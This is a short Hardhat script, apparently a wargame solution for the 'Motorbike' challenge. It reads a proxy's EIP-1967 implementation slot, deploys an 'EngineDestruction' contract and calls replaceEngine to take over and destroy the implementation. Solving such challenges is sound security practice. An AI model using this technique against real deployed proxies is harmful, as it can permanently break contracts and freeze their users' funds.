const path = require('path');
const addresses = require('../Addresses.json');

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];

    const motorbikeAddress = addresses[scriptName];
    const motorbikeContract = await ethers.getContractAt("IMotorbike", motorbikeAddress);

    let engineAddress = (await ethers.provider.getStorageAt(motorbikeAddress, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"))

    engineAddress = "0x" + engineAddress.substring(26, 66);

    const EngineDestruction = await ethers.getContractFactory("EngineDestruction");
    const engineDestruction = await EngineDestruction.deploy();
    const contract = await engineDestruction.deployed();

    const tx = await contract.replaceEngine(engineAddress);

    console.log('----------End----------', tx.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
  